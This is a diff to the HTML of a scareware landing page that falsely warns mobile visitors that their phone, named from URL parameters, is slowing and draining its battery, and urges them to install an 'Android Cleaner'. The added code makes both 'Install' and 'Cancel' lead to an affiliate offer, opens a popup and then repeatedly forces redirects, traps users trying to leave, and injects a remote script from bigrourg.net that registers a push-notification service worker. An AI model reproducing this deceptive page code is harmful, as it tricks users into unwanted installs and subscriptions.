@@ -574,32 +574,44 @@
 				<p> Your
 					<script>
 					document.write(getURLParameter("device_brand"))
-					</script>
-					<script>
-					document.write(getURLParameter("device_model"))
-					</script> will run slower and your battery will drain quickly. </p>
+					</script> 
+					will run slower and your battery will drain quickly. </p>
 				<br>
 				<p> Clear memory and remove intrusive ads from your phone to fix this problem and speed up your
 					<script>
 					document.write(getURLParameter("device_brand"))
 					</script>. </p>
-				<br> <img src="icon.png" style="float: left; padding-right: 10px">
+				<br> <img src="./icon.png" style="float: left; padding-right: 10px">
 				<p> Install Android Cleaner for <strong>FREE</strong> to clean your
 					<script>
 					document.write(getURLParameter("device_brand"))
 					</script> immediately! </p>
 				<br> </div>
 			<div class="buttons">
-				<a class="button exitpoint" href="https://my.toruftuiov.com/click"> <span>
+				<a class="button exitpoint" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2"> <span>
 																Install									</span> </a>
-				<a class="button cancel" href="https://my.toruftuiov.com/click"> <span>
+				<a class="button cancel" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2"> <span>
 																Cancel									</span> </a>
 			</div>
 		</div>
 	</div>
 	<audio autoplay="autoplay" preload="">
-		<source src="https://battery-alert.com/imitate/en/sounds/alert.mp3" type="audio/mpeg">
+		<source src="./alert.mp3" type="audio/mpeg">
 	</audio>
+
+	<script>
+		function ctaclick(){
+			window.onbeforeunload = null;
+			window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+			
+			setInterval(afflowsmartlink, 1000);
+		}
+		
+		function afflowsmartlink(){
+			location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+		}
+		
+	</script>
 
 	<script>
 	var alertText = "Wait!\n\nYour " + getURLParameter("device_brand") + " might still be slowed down.\n\nStay on the page and install recommended app to clean your " + getURLParameter("device_brand") + " immediately.";
@@ -621,6 +633,21 @@
 	}();
 	</script>
 
-
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
 
 </body></html>
